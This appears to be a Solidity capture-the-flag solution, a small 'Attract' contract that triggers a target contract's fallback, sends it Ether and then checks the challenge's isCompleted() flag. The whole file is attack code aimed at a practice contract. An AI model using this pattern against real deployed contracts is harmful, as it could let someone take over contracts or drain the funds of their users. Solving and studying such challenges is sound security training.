pragma solidity ^0.8.0;
import "./1.sol";
contract Attract{
    address payable fall1;
    constructor(address payable addr)public {
        fall1 = addr;
    }
    function attract()public payable  {
        fall1.call("fallback");
        fall1.call{value : msg.value}("");
        // (bool sccuess,bytes memory data) = fall1.call(abi.encodeWithSignature("isCompleted()"));
        fall(fall1).isCompleted();
    }
}